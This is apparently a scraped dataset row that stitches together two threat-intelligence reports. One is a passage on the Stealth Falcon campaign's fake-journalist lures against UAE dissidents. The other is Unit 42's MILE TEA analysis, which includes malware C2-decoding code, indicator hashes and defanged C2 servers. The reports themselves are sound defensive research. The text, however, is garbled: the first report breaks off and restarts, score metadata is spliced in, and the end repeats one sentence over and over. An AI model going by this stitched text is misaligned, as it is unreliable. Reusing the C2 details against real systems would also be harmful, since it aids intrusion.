Dwight and I am currently writing a book about my experiences in the Middle East. My focus is on human factors and rights issues in seemingly non-authoritarian regimes (that are, in reality, anything but). I was hoping that I might correspond with you and reference some of your work, specifically this piece ( http://goo.gl/60HAqJ ), for the book. I'm quite impressed with the way you articulate this complex issue for the masses, and hope to have a similar impact with my book. Happy New Year, AndrewThe link in the email, http://goo.gl/60HAqJ, redirects to http://aax.me/0b152, which, as of December 2015, redirected to a 2013 Huffington Post blog post authored by Donaghy.42 We did not observe any redirect.php behavior with this link, as of December 2015, the aax.me link directly served an HTTP 302 redirect to the Huffington Post (we omitted the date header below). However, it is possible that the link formerly exhibited redirect.php behavior:HTTP/1.1 302 Moved Temporarily Date: Server: Apache/2.2.9 (Debian) mod_ssl/2.2.9 OpenSSL/0.9.8g X-Powered-By: PHP/5.2.6-1+lenny13 Location: http://www.huffingtonpost.co.uk/rori-donaghy/uae-94_b_3549671.html Vary: Accept-Encoding Content-Type: text/htmlWe found that Donaghy had responded to this message shortly after receiving it, offering to meet in-person with Andrew in the UK. Andrew responded several weeks later with the following:From: andrew.dwight389@outlook.comSubject: RE: Correspondence Request Hello Rori, Happy New Year! I apologize for the delay in getting back to you. I was on a ski holiday in upstate New York for the New Year and just returned to my current accommodations in the city. I was due back sooner, but as you may know, the weather has not been agreeable here in the Eastern United States! I am currently situated in the US. while I complete my book to be closer to my publisher and editor. The book focuses on the various guises used by Middle Eastern countries to demonstrate that they are providing equal and fair treatment with concern to human rights. I am working with several organizations in identifying cases that reveal their true lack of concern for liberty and personal freedoms. I'm using these cases as testimony about this under reported issue. Have you heard of a Swedish organization named Al Karama? There website: http://en.alkarama.org/index.php?option=com_content&view=article&id=1005&Itemid=74&slid=102 I have spoken to one of their junior editors and I am hoping to obtain input from some of their sources as well. This issue never gets any smaller does it? I hope that a few loud voices (and a well received book) can make a difference. Cheers, AndrewWhile attempting to determine whether ""Andrew Dwight"" was a real person, we we found a Twitter profile, @Dwight389 for the same persona, and that mentions the same address from which Donaghy received the email.Figure 10: Andrew Dwight's Twitter profile, @Dwight389, mentioning the email address that corresponded with Donaghy in 2013, andrew.dwight389@outlook.comWe found that this account messaged three UAE dissident accounts via Twitter mentions. While we were unable to establish if @Dwight389 successfully attacked any of these individuals, we profile the targets below.4.1. Another Target: Obaid Yousef Al-ZaabiThis section describes how the fake journalist persona contacted Obaid Yousef Al-Zaabi, a blogger who was arrested for criticising the UAE.Figure 11: @Dwight389 contacted @bukhaledobaid on 24 April 2013Obaid Yousef Al-Zaabi was arrested on 2 July 201343 for Tweeting about the UAE94 detainees (94 defendants prosecuted in a mass trial on charges of attempting to overthrow the government)44 on his @bukhaledobaid account, which displays his real name.45 He was released due to health problems a month later, but was arrested again on 12 December 2013,46 a day after talking to CNN47 about the condition of US citizen Shezanne Cassim, imprisoned for making a parody video48 about ""youth culture in Dubai"".49 Al-Zaabi and Cassim were imprisoned in the same cellblock. Al-Zaabi was acquitted on 23 June 2014 of all charges including ""slander concerning the rulers of the UAE using phrases that lower their status, and accusing them of oppression"" and ""disseminating ideas and news meant to mock and damage the reputation of a governmental institution,"" but, according to information received from two UAE sources, Al-Zaabi is still imprisoned in the prisoners ward of a hospital. A coalition of 13 human rights organizations including Amnesty International consider Al-Zaabi's ongoing detention to be arbitrary, and without legal basis.50 Amnesty International reported that ""a senior State Security Prosecution official"" told Al-Zaabi he would continue to be detained even if acquitted.51Al-Zaabi's brother, Dr. Ahmed Al-Zaabi, is one of the UAE94 detainees and is currently serving a 10 year prison sentence. According to a report by the Gulf Center for Human Rights, Ahmed was tortured in prison: his fingernails were pulled out, and he was ""beaten to the point he was left swollen, covered in bruises all over his body and with large amounts of blood in his urine"".524.2. Another Target:Professor Abdullah Al-ShamsiThis section describes how the fake journalist persona contacted professor Abdullah Al-Shamsi, Vice Chancellor of the British University in Dubai.Figure 12: @Dwight389 sent a message on 9 May 2013 suggesting he had targeted @shamsiuae58Professor Abdullah Al-Shamsi (@shamsiuae58) is the Vice Chancellor of the British University in Dubai.53 He (Arabic name: ?.?.??????? ???? ???? ???????)54 is signatory 79 (out of 133) to a March 2011 petition to the UAE government55 for direct elections56 (UAE activist Ahmed Mansoor was arrested after signing the same petition).57 Al-Shamsi's father (???? ?? ???? ??????? ???????) was appointed to, and chaired the first sessions of, the Federal National Council (FNC), a legislative advisory council that is now an elected body. He called for more powers to be given to the FNC.584.3. Additional Targets: Qatari Citizens Sentenced to PrisonFigure 13: @Dwight389 contacted @northsniper on 7 November 2013In May 2015, five Qataris were sentenced (one present in the UAE to 10 years in prison, and four in absentia to life in prison), for posting allegedly offensive pictures of the UAE Royal Family on three Twitter accounts and two Instagram accounts,59 including @northsniper.60 At trial, the prosecution accused the five of being agents of Qatar's State Security, and posting the allegedly offensive pictures as part of a ""military mission"" to ""show that Emiratis had offended their own leaders"".61 The @northsniper account is currently suspended. One Instagram account allegedly used by defendants in this case (@9ip) is still active, and still appears to display unflattering photoshopped images of the President, Crown Prince, and Founder of the UAE.625. Stealth Falcon's Widespread Targeting of UAE FiguresThis section describes how we identified additional Stealth Falcon victims and bait content, and traced Stealth Falcon's spyware to additional C2 servers.Given Stealh Falcon's use of public Twitter mentions to contact individuals, we searched Google and Twitter for instances of aax.me links. The links we found indicated that we could easily probe aax.me to get a comprehensive list of all currently active short URLs, and their corresponding long URLs. Our findings point to a UAE-focused operator, whose bait content and targets are linked to the Emirates. Furthermore, we were able to connect this attack to case from December 2012, where an anonymous UAE activist contacted us and claimed to have received a suspicious link from a Twitter account that was purportedly under government control.5.1. Public Targets and Links to ArrestsThis section describes 24 Stealth Falcon Twitter targets we identified on the basis of them receiving an aax.me link in a Twitt";The Case of the Fake JournalistIn the course of our investigation we scanned the email of journalist Donaghy and found evidence that he had been contacted by a fictitious journalist, whom we linked to Stealth Falcon.We scanned Donaghy's GMail account for any previous messages featuring links that redirected through aax.me. We identified the following message from December 2013, purporting to be from a UK journalist named Andrew Dwight:From: andrew.dwight389@outlook.comSubject: FW: Correspondence Request Greetings Mr. Donaghy, I have been trying to reach you for comment and I am hoping that this email reaches the intended recipient. My name is Andrew Dwight and I am currently writing a book about my experiences in the Middle East. My focus is on human factors and rights issues in seemingly nonauthoritarian regimes (that are, in reality, anything but). I was hoping that I might correspond with you and reference some of your work, specifically this piece ( http://goo.gl/60HAqJ ), for the book. I'm quite impressed with the way you articulate this complex issue for the masses, and hope to have Andrew Dwight's Twitter profile, @Dwight389, mentioning the email address that corresponded with Donaghy in 2013, andrew.dwight389@outlook.com Stealth Falcon is a cyberespionage campaign targeting individuals in the United Arab Emirates (UAE) and other countries in the Middle East and North Africa (MENA) region. The campaign has been active since at least December 2012, when an anonymous UAE activist contacted us and claimed to have received a suspicious;en;{'r': 0.08667032364234778, 'p': 0.9575757575757575, 'f': 0.1589537208118176};{'r': 0.0508390918065153, 'p': 0.8765957446808511, 'f': 0.09610450094649858};{'r': 0.08612177729018101, 'p': 0.9515151515151515, 'f': 0.15794768459451375}
https://unit42.paloaltonetworks.com/mile-tea-cyber-espionage-campaign-targets-asia-pacific-businesses-and-government-agencies/;MILE TEA: Cyber Espionage Campaign Targets Asia Pacific Businesses and Government Agencies;"This post is also available in: ??? (Japanese)In June 2016, Unit 42 published the blog post ""Tracking Elirks Variants in Japan: Similarities to Previous Attacks"", in which we described the resemblance of attacks using the Elirks malware family in Japan and Taiwan.Since then, we continued tracking this threat using Palo Alto Networks AutoFocus and discovered more details of the attacks, including target information. We've seen examples of this attack campaign, which we've named ""MILE TEA"" (MIcrass Logedrut Elirks TEA), appearing as early as 2011, and that it has since expanded the scope of targets. It involves multiple malware families and often tricks targets by sending purported flight e-tickets in email attachments. The identified targets include three separate Japanese trading companies, a Japanese petroleum company, a mobile phone organization based in Japan, the Beijing office of a public organization of Japan, and a government agency in Taiwan.Attack OverviewFigure 1 shows the number of attacks considered as a part of the MILE TEA campaign since 2011. As we can see, the volume of the threats is small in total.Figure 1 Number of threats used in the attack campaignIn the first three years, most of the reported attacks were from Taiwan. saw infections in a few other countries in Asia, but the number was miniscule. In mid-2013, the target base shifted to Japan. Since 2015, most of the reported attacks are from Japan.Figure 2 Reports by countriesThe primary infection vector is a spear phishing email with a malicious attachment. Although we collected several document based exploit files (RTF, XLS, and PDF) in this attack campaign, most of the attachments were executable files that, interestingly, suggest a custom malware installer. Attackers often use self-extracting executable files or existing installer packages to reduce development costs if they require dropping multiple files. However, in this campaign, the attacker group created its own installer program with the following features:Windows executable with folder iconCreates directory with pre-determined name in the same path as the installerCopies decoy files into the created directoryInstalls a batch file and malware on Temp DirExecutes a batch script to delete the installerFigure 3 shows examples of the custom installer and its different folder icons.Figure 3 Custom installers with the folder iconThe use of e-flight tickets as phishing lures has been seen repeatedly for a number of years. The following is the list of malicious attachment samples that use this technique. It is the most prevalent lure used by this threat actor to entice targets for this campaign.Target Year SHA256 Japan 2016 71d5bc9404aa2aa40d79cb16837246a31fa3f12b195330a091e3867aa85f1bc6 Taiwan 2015 7b1509051ccacc4676bf491f63c8a8c7c3b42ffd6cbf3d8bb1dd0269424df985 Japan 2014 8c338446764db7478384700df811937dabc3c6747f54fd6325629e22e02de2cc Taiwan 2014 b393b9774c32de68b35bffd43ace22f9e9d695545de02d8b1d29c8ae38db3488 Taiwan 2014 4607aa975fd9b5aaebe684b26fa31d8ef0840682b148dbcf7f57e9c35d107eb6 Taiwan 2013 f23ab2ee9726c4061b2e0e7f6b9491e384de8103e410871c34b603326b7672da Taiwan 2013 5de5346613be67e3e3bdf82c215312e30bf5ab07aafd0da0e6967897752e0c1d Taiwan 2013 1ed808c7909bde7164d81a8c752a62ced116e03cfb6c7502019d84340f04b76a Taiwan 2012 b6034a3fc6e01729166a4870593e66d9daf0cdff8726c42231662c06358632a7 Taiwan 2012 f18ddcacfe4a98fb3dd9eaffd0feee5385ffc7f81deac100fdbbabf64233dc68Table 1 Samples of malicious attachments masquerading as E-TicketMalwareIn this MILE TEA campaign, the actor uses the following three malware families as the initial infection by the custom installer. The primary purpose of these families is to establish a bridgehead, collecting system information and downloading additional malware from a remote server.Malware Executable Type Cipher C2 address from Blog Elirks PE, PE64, DLL TEA, AES Yes Micrass PE TEA No Logedrut PE, MSIL DES YesTable 2 Malware characteristicsWhile many security vendors classify these samples as different malware families, they share functionality, code, and infrastructure, leading us to conclude that they in fact belong to the previously mentioned malware families.Functionality - Blog AccessAs described in the previous blog post, one of the unique features of Elirks is that it retrieves a command and control (C2) address from a public-facing blog service. When configured, the malware accesses a predetermined blog page, discovers a specific string, and proceeds to decode it with Base64 and decrypts it using the Tiny Encryption Algorithm (TEA) cipher. The same functionality is found in Logedrut, however, instead of using the TEA cipher, it uses DES.A sample of Logedrut (afe57a51c5b0e37df32282c41da1fdfa416bbd9f32fa94b8229d6f2cc2216486) accesses a free blog service hosted in Japan and reads the following article posted by the threat actor.Figure 4 Encoded C2 address posted by attackerThe routine called GetAddressByBlog() in Logedrut looks for text between two pre-defined strings. In this particular case, the malware sample will look for test between ""doctor fish"" and ""sech yamatala"". The threat determines encoded text is ""pKuBzxxnCEeN2CWLAu8tj3r9WJKqblE+"" and proceeds to handle it using the following function.Figure 5 Code finding encoded C2 address from blogThis code deciphers the string with BASE64 and DES. So far all Logedrut samples use exactly the same key, 1q2w3e4r, for decryption. The following Python code can be used to decode the C2 address.import base64 import Crypto.Cipher.DES encoded_string = ""pKuBzxxnCEeN2CWLAu8tj3r9WJKqblE+"" iv = key = ""1q2w3e4r"" decoded_string = base64.b64decode(encoded_string) des = Crypto.Cipher.DES.new(key, Crypto.Cipher.DES.MODE_CBC, iv) decrypted_string = des.decrypt(decoded_string) print decrypted_string 1 2 3 4 5 6 7 8 9 10 11 import base64 import Crypto . Cipher . DES encoded_string = ""pKuBzxxnCEeN2CWLAu8tj3r9WJKqblE+"" iv = key = ""1q2w3e4r"" decoded_string = base64 . b64decode ( encoded_string ) des = Crypto . Cipher . DES . new ( key , Crypto . Cipher . DES . MODE_CBC , iv ) decrypted_string = des . decrypt ( decoded_string ) print decrypted_stringCode - TEA with XORElirks and Micrass employ exactly the same TEA cipher. TEA is a block cipher that operates against 64-bit (8 bytes) of data at a time to encrypt and decrypt. The author of the code added and extra cipher operation by XORing data when a block size is less than 64 bits. For example, if the encrypted data length is 248 bits (31 bytes), the code in both malware samples decrypts the first three blocks (64 x 3 = 192 bits) with TEA. The final block is only 56 bits (248 - 192 = 56), so the code uses a simple XOR operation against the remaining data. This supplement to TEA has not been widely used, and all Elirks and Micrass samples have the same static key (2D 4E 51 67 D5 52 3B 75) for the XOR operation. Due to these similarities, we can conclude that the author of both families may be the same, or has access to the same source code.Figure 6 TEA with XOR Cipher in Elirks and MicrassInfrastructure - C2 ServersBased on our analysis, we see that only a handful samples share the same infrastructure directly. The threat actors carefully minimize reusing C2 domains and IP addresses among their malware samples, and yet they prefer using servers located in Hong Kong no matter where the target resides.Figure 7 Location of C2 serversTarget AnalysisIdentifying targets from spear-phishing emailsWe found a spear phishing email sent to a government agency in Taiwan on March 2015. The email sender masquerades as an airline company, and the RAR archive attachment contains the custom installer named Ticket.exe that drops Ticket.doc and Micrass malware.Figure 8 Spear-phishing email sent to an agency in TaiwanDuring the analysis of the email, we came across an article in a Taiwan newspaper from February 2014 that alerted the public about a similar email message being widely distributed that contained a malicious attachment. The only difference between the email messages in Figure 8 and in the news article was the date. The adversary reused the email message more than a year ago.Identifying targets from decoy filesThe most interesting part of this attack campaign is that the threat actor has been using stolen documents from previously compromised organizations to perform additional attacks since early 2015. These documents are not publicly available nor do they look to be created from scratch by the attacker. Because they contain sensitive data tying to the specific business, it is unlikely that a third party would be able to craft them.The following figure shows the decoy file installed by a sample identified in early April 2015. The file is a weekly report created at the end of March 2015 by a salesperson at a Japanese trading company. The report includes various sensitive information specific to their business.Figure 9 Weekly report from a Japanese trading companyThe properties identified within the document indicate that the company name matches the context, and the person who last modified it is the same individual seen in the document itself. Because of this, the file appears legitimate and it's very unlikely that this document would ever be made publicly available. The threat actor almost certainly stole this document soon after it was created, and reused it as the decoy for next target within a week of the theft.Figure 10 Property of the decoy documentAnother installer found in Japan in May 2015 also contained sensitive information. The decoy looks to be a draft version of a legitimate contract addendum between the subsidiary of a Japanese petroleum company based in Australia, and a China-based company. The document provides details of the deal, including price. It contains a bunch of tracked changes by what appears to be two Japanese speaking individuals. We have confirmed that one of the individuals was a manager of an overseas project of the parent company in Japan by the official release of personnel change in 2013. The file is also considered to be stolen from a target organization and used for decoy for the next attack.Figure 11 Contract addendum decoy fileIn addition to those examples, we found the following decoy files that are likely stolen from previously compromised organizations.Organization Type of document Beijing Office of a public organization of Japan Budget Report Another Trading Company in Japan Internal investigation document Mobile phone organization in Japan Inventory of new smartphonesTable 3 Potential source of another decoy fileWe cannot confirm whether those files were stolen as part of the MILE TEA campaign or not. Either way, it's difficult to imagine that the threat actor sent those internal documents to entirely different organization or industries. One plausible explanation would be that the threat actors target different persons or departments within same organization or industry.Identifying target from MalwareSo far, we have described two trading companies in Japan that are possibly targeted. In addition to these two companies, there is another company in Japan that could be involved in the attack campaign as well. A sample of Logedrut was identified and is capable of communicating with C2 through an internal proxy server in the compromised organization. The sample contains an internal proxy address for a trading company in Japan as seen in String7 in the image below. Thus, the sample is specially crafted for this specific enterprise.Figure 12 Internal proxy address in LogedrutConclusionMILE TEA is five-year-long targeted attack campaign focused on businesses and government agencies in Asia Pacific and Japan. The threat actor behind this maintains and uses multiple malware families, including a custom installer. The actor is interested in organizations that conduct business in multiple countries. The trading companies cover an immensely broad area, from commodity products to aviation around the world. Another possible target is a Japanese petroleum company that has multiple offices and subsidiary companies in overseas countries. A public organization in Japan and a government agency in Taiwan were also targeted.Palo Alto Networks customers are protected from this threat in the following ways:WildFire accurately identifies all malware samples related to this operation as malicious. Domains used by this operation have been flagged as malicious in Threat Prevention. AutoFocus users can view malware related to this attack using the ""Micrass"", ""Elirks"", and ""Logedrut"" tags.Indicators of CompromiseNote: We omitted some hashes containing potentially stolen documents from the compromised organization.Windows Executable Custom Installer064474ac22dd28bf2211ca6602946409925b11f1cfa5e593487bf65e033f1057136978934c8a61e4adff415d4f8f6cd39d110cfa27df2c18367c7036c36e006a1ed808c7909bde7164d81a8c752a62ced116e03cfb6c7502019d84340f04b76a37e79e1ee7cde57cf3af80c54851fa3f9bea3a7208c5cdb5bd290d832f1c50c64607aa975fd9b5aaebe684b26fa31d8ef0840682b148dbcf7f57e9c35d107eb647c489ad097ea2813a993f05d0422361196efa8a7fec08c3f0c0d1d19db9f6a95135377eb6db61ace45e88eca753fb08ae4e185176940e786050c0514a7752945de5346613be67e3e3bdf82c215312e30bf5ab07aafd0da0e6967897752e0c1d71d5bc9404aa2aa40d79cb16837246a31fa3f12b195330a091e3867aa85f1bc67b1509051ccacc4676bf491f63c8a8c7c3b42ffd6cbf3d8bb1dd0269424df9857b3980734ccef487a7ee1f89fcc19a397782e5f38ecd0549c871e8acd918f09287a6ec28357409e547f22edba03c1874500636f9860069db51bfe7a351d204818c338446764db7478384700df811937dabc3c6747f54fd6325629e22e02de2cc91569b8a68d004a7d8ef031846dca3e9facb4401d3fac23d4009fcb2e4c4f2c4ade2eabdf113abeff41a79a7bbbd097187a8e69e16c9e622a53f9f68edc69ec2b6034a3fc6e01729166a4870593e66d9daf0cdff8726c42231662c06358632a7b693be834ffdb1865abfd2fe5e3c6f29134579ef2ecbc2837cb1b85bd7e757e0d50a419daff4290f3870b66ff94050a0cbcd76e278d5c4015a79a6b578e44724d6935edeb50cab2f1ae90776e4c8bdd709ec78ccc71b1e94f079fb9770b7c220e32eb45287443d510b1a30009abd14701c4306b817b4c4d83ff1377b4312d807f18ddcacfe4a98fb3dd9eaffd0feee5385ffc7f81deac100fdbbabf64233dc68f23ab2ee9726c4061b2e0e7f6b9491e384de8103e410871c34b603326b7672daRTF Fileb8795e8dcbe4198160bab1c75505652a15569d6dd6e74b1eae2321edaa00f5b6XLS Fileb393b9774c32de68b35bffd43ace22f9e9d695545de02d8b1d29c8ae38db3488b5b2974251e6bb963c0a37f12a167efd5ba702c142cd9f5571090f8838be4335PDF File200a4708afe812989451f5947aed2f30b8e9b8e609a91533984ffa55d02e60a25806703c28991675aee2e1204f748ce7e2814ea8f2a7ef925693fb52b0ef4d9c755138308bbaa9fcb9c60f0b089032ed4fa1cece830a954ad574bd0c2fe1f104bfe0e6ce5d33c498b9d048c33d5943ed4619383eea00ca6b3c613407b7b5ae96ee6564baf5c5c61f95b8840c1d8a47e84c0704de8062e51c5fa3cf550612a879Elirks027ff8faf7952d791e39c9dda392dfce1094a4ceece46dbd2f53cf2ad5f8bc210cae035a40fcfc760a2f47b98ab27feaba9cee95d59467ab09b32063ac17df5b0cffc3fb0b4ebf2a4b8cad4fb2a477737e4f8ca0b45494e541b2f92ee9719fa80e317e0fee4eb6c6e81b2a41029a9573d34cebeabab6d661709115c64526bf950f1f6838c591a0456881fbcd65d511932d2fa6c16fcb27eb4a793240ef0c25de1194650bdfeb03940e07718726cfeb49645b089899e216a79cbafe7fae01678a138993de871eefc72967b61b7c030649e1881be8adacbee933636fb4fc2ae4441434fa8719602b252bb12e1e0023e86becada3b86ed07e1f7836fdf057dcebf51fb47c308bfed89069a4dca561cf818910c25bf2e6bf2679992f01e2da39350624ae29defeb167cba2dc8b647514e9c44c027c6f2ad6c789ec836358c1007f74262d7106f1a227f278bcb344bc20186ff4231e1513aa61bd25c1da833cc142c527a836f9db61b63a7d90b9c13ec5e7dfdada65eae2860e748ba5dd4ca6918b9b2dd6ff42d53b01c6f1c4ee3336c3ada53739de587adc78fb011237f926326f6138ae57f7e565dc51544c7b7c9b890eddeb3da7632a623e16cba5bdfd6141e2413acc6fec0e7275b3774af1274872d42c0afc330cf48d543ff8fdf4bb4b37ed7340cc76ef34c03a04ad393b68c2110b0e58ec0a7b9da16fd5005993bd8700b95145496be07ab8a3fad86980219073a28576106c8bca5c8fd70c882eef0e9df42853a3c1aa683d296c88bd6565a8b417f09e392ceae4c285464859df1953e75382569ee23acc18b5ff0f18f02d5010d0e9e9870a9b5845c3618e6f31ee4552c47558f2790133e5987f6f3eb960c5ad547e149a037b1f5a56526026d8a22f7fa51e5b01d16a4d39cc30a6dd501d214c8ee4916e46ab338c3437f4cf1ae6f71d1ae65d4b91593d1cc110c966a3b3bcca6c02492e6df5dff83cd0653f9ffca9d5256e5e4377e4d0998c09db357d8cd393c949af66a3cd7592a427752dc876430dbef2633e849407f22fae3e5c6d2bf1921f1b11074229c797ea1e57a85cbc05880c84636c3af6ca45f5ebc413fdde9e706603151e4ce081bc73addf666ba6c9d198ba688e33d45ae76dbbbd0f7462f4736453c36abfbf3d6fd1cca02a8e7ef0ea610a7902d0cbf32897815c10a68c97f27d23cde38111f1e0167d942d5c6d154237197bf2ce5acd108ac5f326ba303dac3096ced8afd3e7c88dc14e58765161fd2c0082f4bd3abd557513e51b84f85d1ac03cfbd049284416640f624aea08821bcf7c84117f538361883e7ba3dd6d7825059f1b9378c71726fb70189cbd3d6681299784fcca9d2f61c4a8b94d4a6ef8a12cf36422ddf409ce860047f1d6f8b193f71c8587e3a0312a6c4374989cbcca48dc54ddcd3fbd54b48833afda991a6a2dfdea8597beac6316597dbefb5d5193bdf72fabeebeca9466c1aef6289550c765614b85a227dd905a3fb458e35c76adfede77a03e65c43b4dff8162f5e438f4e55d658616976726d25f25646964edd23e9355efc746a11c5a11ef7d14ab6115b72d7587f1ca62e1af433342fca7665cda0e608aadf8852e7384654e8074380f34fd0d8b413fe0149e3bbbef8c40f2fe2c835ea6d8399867d392099984853a772d38ae8bc8dd186369542d4e97c9967cea667de226b4738c3d6a2249e19a6fbff2109f8c0a2226d378baa1a682b782163143ce612b790d7cbd46d08a83ebb3bf866f4f8cbe7a11ae59e607fdba324316925ff1bf16d10b4d8af271901e63873bc2bfb691569b8a68d004a7d8ef031846dca3e9facb4401d3fac23d4009fcb2e4c4f2c49384bded640a8dda65558f92e8ef34f73ec13540160bf149aa3986e01dc688bb93c5bd2914a1ebd9584dbe1e0d8de1060e0bea2fa51789ede5f11da25ae5c65b9d212233e669d61fb1c432c9889f4c723819ece549954ff6f741921534ed63369f979a94f47f70c833ac9c3195fc245d58b7830f7b6857e875e07e67c3aa835ea20b019095b3135f40c075b0bdb1e1ef1c6e7fbb0ce3e643a2222c70e4a1254da29a1dfa7142efdcfbc39e35f15d1718502050d81302afd1ba464d705a9afab3a6f74c22bd7a808a79fbf2e7e71a02aa9755b0bfad2c2888b51e4161dbf8c069ab1f5290d36fcedb249bb3ed1251663130607fc578a1bf910d9a60eb8ba7de1ab03ae41d7082405a9f4d74792c7438b0a450dee7fa67f63fcc11c050bc527c68b6856d07881e24eef676e8766eba258d6ed47359b34134e98be58190927ba22cbf49ec24eb1bd4e09f4e60a3b72bda0907c2400e3221e3fee28eeff76136b8dfbff33857480038d9ee24cc848140636616a04c90bb863673bb4720ff5a61b5c3c1c64b167303518f5cf762ae76b6a4026248767e394e0cbc9bc961cd37833937c4407ce7718eecaa0d09df1352e3bbe13fa9600628bd0a42dbee26d7ff4534a0c949f811b2d67ab76564223b0c4ae40179b14f892c4f6f6ab5de363dbf4df17fcd4789bf41c8498ff83b13a53d83cb503e27b3283b2c2585d793a5ea6771d8aad1617e66d84da7371884ad31a21f099754784ca585622d3197778d9886d56232d5db887a8875346a118288062d36ad44eadb2e5d345e2cbf5233f8f36ecf3809d642f5b4cbfa29ca268b18ed76efc3efef0f4b3866e67b6ef6af32f6cca468bbd7cd8432b89148bc21e3a9e76970fb8d33b4103af9c94599ca8401c5e6d71a97e01441c1eb568ca57cb59c1e814b22d5611a53f714bc85eb2be00b08d9b6f13fe44bd67d0828c375760ebe16a62e73b5eff1540ff587a6c358a63d7d5ab5f5cfe4ab42e5900ed193f305d6e3a28ac8743b64d1ac5dc2e0e1ef1a927322933c81e50692aa80020ade381d6fa8751e0f1eabab78e8860c47d95c6bc1e224b02f6ce929a008dd9c58e2814ecfb84be2cd8df8a809aa2ec64a4a82553047e0507ee5eaeb778224f16311af071d3f82a4f04eacb6b73b97b001fcd40051a8963050fcee9b8e6902b62e76138c9ed8a6d376f35a0361f85519e47b45ee776cf0474f28f18ddcacfe4a98fb3dd9eaffd0feee5385ffc7f81deac100fdbbabf64233dc68f6cb59b697cd27359f12228cf11ae5aa21b17e1845ae8007c668319672cdfb33fdcaac1a818a088e41bcf764493e203089e21bd35521da1c3c999e90eccb99a8Logedrut2d9c0f32401404ab515690e052d378b0acdd22e30ce8a6a2ce6e5088b2c627954591134a77b3532c85576e7b1942476eb73775d118e49ad215dbbe1c4276176066c9e75398c202c5c2b917fd0fe9a3089c6a1fa5e74a64c6a2c2b5d6acaf2f14843b14a44374987ebdd735d23ac89f8aef8c6972510d53d283eb79004c5e3ec78be58e9b58727e9195c037810a5e57ec6a9107547e2d4e4b75e299c5f4ad9be0a205027c7f1241dce0807de7733a23ffc398c64bd2130f2fd17316c2860b5dc1a74604f65d92579295b4fa16f6cca91fc2a66387eb1c1744b22081fb05aefa16afe57a51c5b0e37df32282c41da1fdfa416bbd9f32fa94b8229d6f2cc2216486c267e01e047a0ddfa96fb5c65483532c44647dc7153c149aeeb9833b9952f7b5cc8844b46972af665739e8fe689412621737bc87ca9f700e873622006d8fc62ad1373c0be7cdb76b2735d0df87d81db09eb3583f145cdcfe4ac6d1d217de9781e8186a03a53cba3cfe6b0ea3bcbc7893eb1da84e612060ecfffb8110fa0199a2Micrass4bcc727506706634b56cad358828037189898097c363e2ea2147ec253b81a009674865c337f23ab23b7c866893d179467e5f834ee95a0952aaeb7fa7f3d3457368ec202ebce297031a7d02ab0417ec01c5fc0a94171b1443d3bfd6ad5f27055e6b2fea7284bcc4f505b124d216bb33f723a1c93f3a3d5d9a10307d4069950cfb70c37934e89eb796724a36f32ff654b01341531c980cee09d26c16a1320fcdf77b3980734ccef487a7ee1f89fcc19a397782e5f38ecd0549c871e8acd918f09280db64dc96c59893203074e36852537c0f617e5a5fa73548d65618a16b5f6b4e94ec1723693c21ff239b33c555dc1e4589a3310fa11bb9fe8b742a9231c36134a68735dccb378eba908f487906050bacedd73fa8f6503623048f03d71071170cb7f72805660dc2f76c75d7440cfdf98831ccb5e49985b2f476a0c7b336c618c4bf58614f2e5b195ce1ee1c096c1b6b560e81d2a31e7ad04522d5d705c2788293cf7d2d2efaf0eb483cc3152b568ebc45ca0540de2ee57ce3536ae20d7d4a268de205a7287d624ef4690da26d9ec44f008ee17efd8ff83c18364e8727215ee4f1e4351c9f8862677bfc1d2992922ac9985a05504f6050e6916fd7bae3b1501810e78f1d60aea0652d65275c40e88be9409eb9117dc5c1f8aac122eed338054f16Command and Control Servers124rsdtw4r23rsae.4pu[.]comaccount.yahoo-account-tw[.]comasp.domain-googletw[.]comatashaerlanmuscle.nikitacommonprofessional.cloudns[.]infobillyxcatch.garfieldmercyscream.cloudns[.]euchargewike.google-robot[.]comdns.pchome-shop[.]comdockcharge.msn2013[.]comdueyamata.ddo[.]jpewr235rew.gsn-operation[.]comflights.marketddy[.]comgooglehostlogin.hopto[.]orghiair.henet-web[.]nethotlogin.ddo[.]jpindication.google-robot[.]comislam.youtubesitegroup[.]comjumpintothesea.seesaa[.]netkmtgogogo.bluestartw[.]comlikyamaha.msn2013[.]comlovetamakata.mywww[.]bizlovetamaya.mywww[.]bizlovetrick2014.redirectme[.]netmail-asp.domain-googletw[.]commails.domain-googletw[.]commakoidata.msn2013[.]commis.domain-googletw[.]compls.utvsoft[.]compress.ufoneconference[.]comrdane.msn2013[.]comreposibility2014.ddo[.]jpsce.hopto[.]orgserver.henet-web[.]netservers.domain-googletw[.]comservice.net-seed[.]comsftp.domain-googletw[.]comsiteadmin.yahoo-account-tw[.]comtakamato.4pu[.]comtaoyato.domain-googletw[.]comtomatopota.4pu[.]comtrains.pchome-shop[.]comtrustlogin.ddo[.]jptrustly.google-robot[.]comtwitter.google-robot[.]comvmail.net-seed[.]comwebmail.domain-googletw[.]comwww.vaseline.dumb1[.]comxuite.henet-web[.]netyahamata.google-robot[.]comyourservers.blog-pixnet[.]comzoe.minidns[.]net101.1.25[.]40101.1.25[.]58101.1.25[.]90103.17.119[.]137103.20.192[.]248103.245.209[.]125103.245.209[.]153103.245.209[.]21103.245.209[.]62103.28.45[.]241103.39.109[.]30103.39.109[.]51103.39.109[.]66103.39.109[.]68103.59.45[.]54113.10.246[.]154113.10.246[.]172113.10.246[.]176128.199.34[.]140142.91.119[.]136173.254.227[.]138175.45.22[.]122175.45.22[.]233180.43.171[.]205202.82.225[.]161203.124.14[.]131206.161.216[.]144210.209.81[.]170210.209.81[.]172210.209.81[.]173210.209.81[.]188210.209.81[.]192210.209.81[.]249210.209.86[.]136210.209.86[.]158210.209.86[.]162210.209.86[.]175210.209.86[.]176210.209.86[.]18523.253.46[.]6454.178.93[.]21259.106.98[.]13959.188.239[.]11059.188.87[.]1759.188.87[.]3474.126.176[.]21874.126.177[.]9274.126.183[.]17095.211.14[.]5396.46.0[.]17896.46.0[.]18096.46.10[.]17996.46.10[.]18196.46.10[.]23596.46.10[.]237";The threat actor is also likely to be targeting different organizations or industries. The threat actor is also likely to be targeting different persons or departments within the same organization or industry. The threat actor is also likely to be targeting different organizations or industries. The threat actor is also likely to be targeting different persons or departments within the same organization or industry. The threat actor is also likely to be targeting different organizations or industries. The threat actor is also likely to be targeting different persons or departments within the same organization or industry. The threat actor is also likely to be targeting different organizations or industries. The threat actor is also likely to be targeting different persons or departments within the same organization or industry. The threat actor is also likely to be targeting different organizations or industries. The threat actor is also likely to be targeting different persons or departments within the same organization or industry. The threat actor is also likely to be targeting different organizations or industries. The threat actor is also likely to be targeting different persons or departments within the same organization or industry. The threat actor is also likely to be targeting different organizations or 